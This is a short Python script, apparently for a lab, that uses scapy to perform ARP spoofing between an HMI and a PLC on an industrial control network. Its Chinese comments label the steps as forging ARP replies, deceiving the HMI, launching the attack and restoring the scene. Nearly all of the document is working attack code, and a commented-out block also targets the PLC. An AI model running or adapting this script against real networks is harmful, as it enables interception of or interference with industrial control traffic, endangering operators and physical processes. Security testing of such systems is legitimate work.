from scapy.all import *
import time

def arp_spoof(target_ip, psrc_ip, target_mac, my_mac):
    # 构造伪造的ARP响应包
    arp_response = ARP(op='is-at', pdst=target_ip, hwdst=target_mac, psrc=psrc_ip, hwsrc=my_mac)
    send(arp_response)
    time.sleep(1)

try:
    plc_ip = "192.168.1.3"
    plc_mac = "e0:dc:a0:36:c0:7e"
    hmi_ip = "192.168.1.4"
    hmi_mac = "e0:dc:a0:30:49:fa"
    my_mac = "00:0c:29:8e:5c:1b"
    arp_spoof(hmi_ip, plc_ip, hmi_mac, my_mac)# 欺骗hmi
    # while(True):
    #     arp_spoof(plc_ip, hmi_ip, plc_mac, my_mac)# 欺骗plc
    #     break
    print("发起攻击")
    time.sleep(5)
    arp_spoof(hmi_ip, plc_ip, hmi_mac, plc_mac)# 恢复hmi
    #arp_spoof(plc_ip, hmi_ip, plc_mac, hmi_mac)# 恢复plc
    time.sleep(5)
    print("恢复现场")
except KeyboardInterrupt:
    print("ARP spoofing stopped")